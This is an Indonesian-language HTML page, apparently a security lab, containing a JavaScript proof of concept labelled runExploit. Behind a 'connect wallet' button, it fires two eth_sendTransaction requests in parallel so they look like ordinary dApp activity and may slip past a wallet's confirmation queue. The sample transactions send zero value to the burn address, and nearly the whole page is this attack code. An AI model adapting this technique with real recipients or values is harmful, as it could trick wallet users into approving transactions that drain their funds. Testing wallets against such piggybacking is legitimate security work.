<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Uji Coba Bypass Piggybacking</title>
</head>
<body>
    <h1>Lab Keamanan: Bypass Antrean Transaksi</h1>
    <button id="main-btn" style="padding: 20px; font-size: 18px;">Hubungkan Dompet & Siapkan Transaksi</button>
    <div id="output" style="margin-top: 20px;"></div>

    <script>
        const output = document.getElementById('output');

        // Fungsi ini mencoba melakukan batching transaksi agar terlihat seperti 
        // aktivitas dApp yang sah (misal: Approve lalu Swap)
        async function runExploit() {
            try {
                // Skenario: Mengirim transaksi ganda secara berurutan
                // Teknik bypass: Menggunakan Promise.all untuk mengirim permintaan bersamaan
                // Beberapa dompet memiliki celah di mana mereka memproses array jika masuk dalam satu tick
                
                const tx1 = { method: 'eth_sendTransaction', params: [{ to: '0x000000000000000000000000000000000000dEaD', value: '0x0' }] };
                const tx2 = { method: 'eth_sendTransaction', params: [{ to: '0x000000000000000000000000000000000000dEaD', value: '0x0' }] };

                output.innerText = "Mengirim batch transaksi...";

                // Mengirim permintaan secara paralel tanpa 'await' di tengah
                window.ethereum.request(tx1);
                window.ethereum.request(tx2);

            } catch (e) {
                output.innerText = "Ditolak: " + e.message;
            }
        }

        document.getElementById('main-btn').addEventListener('click', runExploit);
    </script>
</body>
</html>
